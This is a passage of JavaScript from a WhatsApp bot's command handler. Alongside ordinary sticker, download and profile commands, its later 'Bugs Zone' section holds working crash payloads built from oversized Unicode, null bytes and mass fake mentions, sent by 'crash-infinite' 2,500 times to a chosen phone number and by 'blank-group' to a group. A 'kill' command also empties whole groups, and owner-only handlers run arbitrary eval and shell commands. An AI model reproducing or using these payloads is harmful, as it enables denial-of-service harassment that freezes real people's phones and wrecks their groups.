caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n• ');

reply(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//==================================================//              
        case 'delpp': {
if (!Owner) return reply(mess.owner);
bot.removeProfilePicture(bot.user.id)
reply("success")
}
break
//==================================================//               
        case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Reply Video/Image with Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await bot.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum video period? 10s!')
let media = await quoted.download()
let encmedia = await bot.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return reply(`reply photo/Video with Caption ${prefix + command}\nDuration Video 1-9 seconds`)
}
}
break
//==================================================//        
        case "demote": case "demote": {
if (!isGroup) return m.reply(mess.group)
if (!isAdmins && !Owner) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(`bot is not an admin in this group`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bot.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => m.reply(err.toString()))
} else return m.reply('example:254XX')}
break
//==================================================//                
        case "tts": {
if (!text) return reply("example:Hallo")
if (text.length >= 300) return reply("maximum text must be 300!")
reply("process.....")
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
bot.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return reply(e.toString())
}
}
break
//==================================================//          
        case "setbio": case "setbiobot": {
if (!Owner) return m.reply(mess.owner)
if (!text) return m.reply('reply a rext')
bot.updateProfileStatus(text)
m.reply("Success updated bio ✅")
}
break
//==================================================//            
        case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)

let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
fs.unlinkSync(ran)
})

}
break
//==================================================//          
        case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) reply(`reply stiker with caption *${prefix + command}*`)
var media = await bot.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
bot.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
await fs.unlinkSync(media)
}
break
//==================================================//          
        case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`tag/reply Video/Audio with Caption ${prefix + command}`)
let media = await bot.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
bot.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
//==================================================//    
        
                 case "kill": {
	  if (!m.isGroup) return m.reply(mess.group)
          if (!Owner) return m.reply(mess.owner)
 if (!isBotAdmins) return m.reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != bot.decodeJid(bot.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          m.reply("Initializing Kill command💀...");
      
      await bot.removeProfilePicture(m.chat);
      await bot.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await bot.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            bot.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              bot.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                m.reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
bot.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break; //==================================================//      
        case 'autorecordtype':

                if (!Owner) return reply(mess.owner)

                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)

                if (q === 'on') {

                    autorecordtype = true

                    reply(`Successfully changed auto recording and typing to ${q}`)

                } else if (q === 'off') {

                    autorecordtype = false

                    reply(`Successfully changed auto recording and typing to ${q}`)

                }

                break  
//==================================================//      
        case "getpp": {
if (q) {
try {
var ppWong = await bot.profilePictureUrl(q, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await bot.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://telegra.ph/file/7cde96ce87ae7d9bd22a4.jpg"
}
bot.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
}
}
break
//==================================================//
        case 'autotype':
                if (!Owner) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break
//==================================================//     
        case "play":{
                if (!text) return reply(`\n*ex:* ${prefix + command} impossible\n`)
                
               await reply(`processing your request`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                bot.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: loli })
            }
            break
        
//==================================================//              
        case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return reply('reply sticker')
reply('wait....')
let media = await bot.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
bot.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
//==================================================//                 
        case 'listblock':{
let block = await bot.fetchBlocklist()
reply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked Contacts' : '*' + block.length + '* Blocked Contacts'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//==================================================//            
        case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return reply("maximum video duration 30 seconds!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
bot.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return reply("reply to video")
}
}
break
//==================================================//      
        case 'tiktok': case "tt": { 
             
    if (!text) return m.reply(`Example : ${prefix + command} link`);
    if (!text.includes('tiktok')) return m.reply(`Link Invalid!!`);
    reply("Please Wait..");
    
    // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return m.reply('Api error');
            
            // Mengambil URL video dan audio
        const title = `*Successfully*`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            bot.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            bot.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: null });
        })
        .catch(err => reply(err.toString()));
}
break;
//==================================================//           
        case "yts": {
if (!text) return reply("Example:Dj Tiktok")
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Your Search*\n\n'
for (let i of data.all) {
teks += `*◦ Title :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Duration :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
//==================================================//           
        case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return m.reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by Simple Wa-Bot!*" }, { quoted: m });
 } else if (res.type === "image") {
 await bot.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bot.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by Simple Wa Base!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await bot.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("failed to get media.");
 }
}
break   
//==================================================//             
        case "setppbot": case "setpp": {
if (!Owner) return reply(mess.owner)
if (/image/g.test(mime)) {
let media = await bot.downloadAndSaveMediaMessage(qmsg)
await bot.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("Success update bot pic ✅")
} else return reply("reply a photo")}
break
//==================================================//     
        case 'lyrics': {
  if (!q) return m.reply('Example: lyrics <keyword>,<amount>\n\nExample: lyrics duka,3')
  let [keyword, jumlah] = q.split(',').map(v => v.trim())
  if (!keyword) return m.reply('provide a valid key word')
  jumlah = parseInt(jumlah) || 3

  try {
    let res = await fetch(`https://apikey.sazxofficial.web.id/api/search/lyrics?q=${encodeURIComponent(keyword)}`)
    let data = await res.json()
    if (!data.status || !data.result || data.result.length === 0) {
      return m.reply('Lyrics not found.')
    }
    let hasil = data.result.slice(0, jumlah).map((item, i) => {
      return `*${i + 1}. ${item.title}* - _${item.artist}_\n\n${item.lyricSingkat.trim()}\n`
    }).join('\n────────────\n\n')
    m.reply(`*Downloaded Lyrics: ${keyword}*\n\n${hasil}`)
  } catch (e) {
    console.error(e)
    m.reply('an error has occurred while fetching lyrics.')
  }
}
  break
//==================================================//    
case 'chatgpt': {
    if (!text) return reply(`Example: ${prefix + command} what is a bot?`);
    const model_list = {
        chatgpt4: {
            api: 'https://stablediffusion.fr/gpt4/predict2',
            referer: 'https://stablediffusion.fr/chatgpt4'
        },
        chatgpt3: {
            api: 'https://stablediffusion.fr/gpt3/predict',
            referer: 'https://stablediffusion.fr/chatgpt3'
        }
    };

    try {
        let results = [];
        for (const [model, config] of Object.entries(model_list)) {
            try {
const axios = require('axios');
                const hmm = await axios.get(config.referer);
                const { data } = await axios.post(config.api, {
                    prompt: text
                }, {
                    headers: {
                        accept: '*/*',
                        'content-type': 'application/json',
                        origin: 'https://stablediffusion.fr',
                        referer: config.referer,
                        cookie: hmm.headers['set-cookie'].join('; '),
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'
                    }
                });
                results.push(`*${model.toUpperCase()}*:\n${data.message || 'invalid query.'}`);
            } catch (err) {
                results.push(`*${model.toUpperCase()}*:\nHere are the results.`);
                console.error(`Error on ${model}:`, err.message);
            }
        }
        m.reply(results.join('\n\n'));
    } catch (e) {
        console.error(e);
        m.reply('an error has occurred.');
    }
}
break
//==================================================//    
        case 'arting': {
    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
    await bot.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await bot.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        bot.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        m.reply('failed to create image!');
    }
}
break;
//==================================================//          
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gbb": case "10gb": case "unli": {
    if (!Owner) return reply(mess.owner)
if (global.apikey.length < 1) return reply("Apikey is inactive!")
if (!args[0]) return reply("Example: name,254XXX")
if (!text.split(",")) return reply("Example: name,254XXX")
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply("Example:name,254XXX")
var ceknya = text.split(",")[1]
if (!ceknya) return reply("Example:name,254XXX")
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await bot.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomber Buyyer must be Valid!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel2[0].toLowerCase()
let email = username+"@xrzteam.ruzx"
let name = capital(username)
let password = username + "015"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Panel created successfully ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Name :* ${name} Server\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData is active for number ${global.panel2[1].split('@')[0]}`)
var datapanel = `Hai @${global.panel2[1].split`@`[0]}
*DATA PANEL*

* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}
* *Tutorial :* https://youtu.be/Ry9hTumqR8U?si=fdwk50ccl1r_eVo3

*Note / Caution :*
> don't share panel free
> don't share data panel
> don't share link panel
`
bot.sendMessage(global.panel2[1],{text: datapanel }, { quoted: loli })
}
break
  case "getname": {
if (q) {
try {
var name = d4tbs.users[q].name
} catch {
var name = await bot.getName(q)
}
reply(name)
} else {
reply(m.pushName)
}
}
break      




//==================================================//
case 'addprem': {
if (!Owner) return reply(mess.owner)
if (args.length < 2)
return reply(`Use :\n*#addprem* @tag days\n*#addprem* number days\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
reply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
reply("Sukses Via Number")
await sleep(2000)
bot.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://i.ibb.co/39rrkttP/455944eb4d07a365.jpg`}, caption: `success added prem user`},{quoted: mdmodes })
}
}
break
        
        //Bugs Zone//
        //(Function protocol delay)//
        async function protocolbug(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".CikssXyz || Beginner" + longUnicode,
        title: "FlixceStrom🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363419768812867@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await bot.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await bot.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        async function buttonscrashX(target, Ptcp = true) {
  try {
    await bot.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "xvoids Infinite is here...\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "##",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
        //Func Blank Group//
        async function PollingX(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `1@newsletter`,
                        newsletterName: "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(15000) + "ꦾ".repeat(90000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(49999),
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: [ target, ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net` )],
                groupMentions: Array.from({ length: 49999 }, (_, i) => ({ groupJid: i === 0 ? '12036332@g.us' : '120999' + Math.floor(Math.random() * 1e10).toString().padStart(10, '0') + '@g.us', groupSubject: '\u0000' }))
            },
        };

        await bot.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("error :", err);
    }
}         
        

async function crashInfinity(target) {
  const payload = {
    viewOnceMessage: {
      message: {
        viewOnceMessage: {
          message: {
            documentMessage: {
              title: "崩壊".repeat(100),
              fileName: "Xeon_崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊崩壊.pdf",
              mimetype: "*/*",
              fileLength: "18446744073709551615",
              pageCount: -2147483648,
              mediaKey: "",
              mediaKeyTimestamp: 0,
              jpegThumbnail: Buffer.alloc(1),
              caption: "\uDC00\uD800".repeat(5000)
            }
          }
        }
      }
    }
  };

  const msgKey = {
    remoteJid: target,
    fromMe: false,
    id: "Xeon_INF_" + crypto.randomUUID(),
    participant: "0@s.whatsapp.net"
  };

  await bot.relayMessage(target, payload, { messageId: msgKey.id });
}
//==================================================//      
        case "crash-infinite": {
if (!Owner) return reply('[ ! ] Only premium user can use this command')
if (!q) return reply(`Example: ${prefix + command} 254××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 250; i++) {
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
await crashInfinity(target)
}
reply(`Suscesfully sending bug to ${target} ✅`)
}
break
//==================================================//      
        case 'blank-group': {
    if (!Owner) return reply("This Feature Only Send By Bot Number");
if (!m?.isGroup) return reply(mess.group)
    bot.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 15; r++) {
        

    await PollingX(m.chat);
    await PollingX(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            reply(`[ ؆ ]𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐃𝐎𝐖𝐍
 _*\`Status\`*_ : *SUCCESS  ATTACK ✅*
 _*\`Type\`*_ : _${command}_
>  ⚠️ WARNING ⚠️


> 𝐏𝐚𝐮𝐬𝐞 𝐟𝐢𝐯𝐞 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐬𝐨 𝐭𝐡𝐚𝐭 𝐛𝐨𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝`)   
}
break;   

//==================================================//
default:
if (budy.startsWith('=>')) {
if (!Owner) return reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.length > 100000) {
if (sender == botNumber) return
if (!isGroup) return afgan.updateBlockStatus(m.sender, 'block')
}
//==================================================//
if (budy.startsWith("#")) {
if (!Owner) return reply(mess.owner)
try {
let evaled = await eval(q)
if (typeof evaled !== "string") evaled = util.inspect(evaled)
} catch (e) {
console.log(e)
}
}
//==================================================//
if (budy.startsWith('_')) {
if (!Owner) return reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}
    } catch (err) {
        console.log(require("util").format(err));
    }
};
//==================================================//
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
//==================================================//
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})